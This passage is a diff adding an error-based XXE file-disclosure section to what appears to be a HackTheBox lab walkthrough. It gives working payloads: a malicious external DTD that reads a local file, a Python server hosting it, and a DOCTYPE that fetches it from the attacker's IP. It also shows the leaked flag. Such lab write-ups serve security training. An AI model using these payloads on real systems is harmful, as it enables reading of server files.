@@ -1001,3 +1001,82 @@ The application returns the contents of the target file, wrapped safely inside a
 ---
 
 ### Advanced File Disclosure - Error Based
+
+In some scenarios, an application may **not reflect any XML output** in its response. When this occurs, direct data extraction through entity reflection is not possible. However, if the application displays **XML parsing or runtime errors**, it may still be possible to leak sensitive information through **error-based XXE exploitation**.
+
+This technique abuses the parser’s error-handling behavior to force the contents of a local file to be included in an error message.
+
+**Step 1: Trigger XML Parsing Errors**
+
+We begin by testing whether the application displays XML parsing errors. By referencing a **non-existent entity**, we intentionally submit malformed XML:
+
+```xml
+<email>
+    &errorEntity;
+</email>
+```
+
+The application responds with an error message and reveals the file system path of the executing script:
+
+```
+/var/www/html/error/submitDetails.php
+```
+![Filtered output](images/xxe-error.png)
+
+This confirms that:
+
+- XML parsing errors are visible to the user
+- The back-end directory structure is partially disclosed
+
+Both conditions are required for error-based XXE exploitation.
+
+**Step 2: Create a Malicious External DTD**
+
+Next, we create an external DTD (`xxe.dtd`) designed to concatenate the contents of a local file with a non-existent entity, forcing the parser to raise an error that includes the file contents.
+
+```bash
+<!ENTITY % file SYSTEM "file:///flag.php">
+<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
+```
+
+We then host the `DTD` on our attacking machine:
+
+```bash
+python3 -m http.server 8001
+```
+
+In this payload:
+
+- `%file` references the target file
+- `%nonExistingEntity;` ensures a parsing error is triggered
+- The parser attempts to resolve the combined entity, leaking the file contents in the resulting error message
+
+**Step 3: Reference the External DTD**
+
+We include the external DTD within the XML request by defining and invoking a parameter entity:
+
+```xml
+<!DOCTYPE email [ 
+  <!ENTITY % remote SYSTEM "http://OUR_IP:8001/xxe.dtd">
+  %remote;
+  %error;
+]>
+```
+
+![Filtered output](images/xxe-error2.PNG)
+
+Unlike reflective XXE attacks, this technique does **not require referencing the entity within a visible XML element** (e.g., `&joined;`). The leakage occurs entirely during XML parsing.
+
+**Step 4: Extract File Contents from Error Message**
+
+The application returns an error message containing the contents of the target file:
+
+```
+<?php $flag = "HTB{3rr0r5_c4n_l34k_d474}"; ?>
+```
+
+![Filtered output](images/xxe-error3.png)
+
+This confirms successful **error-based file disclosure via XXE**, even though no application output was directly reflected.
+
+---
